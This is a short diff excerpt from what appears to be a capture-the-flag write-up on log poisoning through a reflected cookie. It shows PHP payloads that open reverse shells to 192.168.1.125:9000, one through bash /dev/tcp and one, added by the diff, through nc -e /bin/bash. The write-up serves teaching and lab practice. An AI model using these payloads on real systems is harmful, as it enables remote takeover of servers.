@@ -29,6 +29,9 @@ We see that the cookie is being reflected, so we can log poison it changing `use
 
 # Since the close tag imples a semicolon, we can't avoid remove it
 <?php system("bash -c 'bash -i >& /dev/tcp/192.168.1.125/9000 0>&1'")?>
+
+# We could have used nc
+<?php system("nc 192.168.1.125 9000 -e /bin/bash")?>
 ```
 
 <br>
